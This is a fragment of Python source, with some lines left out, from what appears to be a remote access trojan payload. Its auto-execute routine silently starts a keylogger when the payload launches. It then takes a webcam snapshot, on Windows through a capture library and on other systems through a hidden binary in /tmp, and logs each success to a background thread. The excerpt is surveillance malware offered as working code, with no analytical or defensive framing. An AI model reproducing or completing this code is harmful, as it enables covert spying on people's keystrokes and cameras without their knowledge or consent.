...
def auto_execute_operations(client_socket=None):
    """
    Automatically execute key operations when payload starts
    This function runs silently in the background
    """
    operations_log = []
    
    try:
        # 1. Start keylogger silently
        try:
            if win_client():
                nt_kl.stop_freeze()
        ...
        # 4. Try to capture webcam (if available)
        try:
            if win_client():
                try:
                    import vidcap
                    ...
                    webcam_path = os.path.join(get_temp(), 'auto_webcam.jpg')
                    img.save(webcam_path, quality=95, optimize=True, progressive=True)
                ...
                webcam_path = '/tmp/auto_webcam.jpg'
                if os.path.exists('/tmp/.st_imsnp'):
                    result = run_command(f'/tmp/.st_imsnp -w 1 {webcam_path}')
                    if no_error(result) and os.path.exists(webcam_path):
                        operations_log.append("[+] Webcam snapshot captured")
                    else:
...
def run_auto_execute_background():
    """
    Run auto-execute operations in background thread
    """
    def background_task():
        try:
            sleep(2)  # Small delay to ensure payload is fully loaded
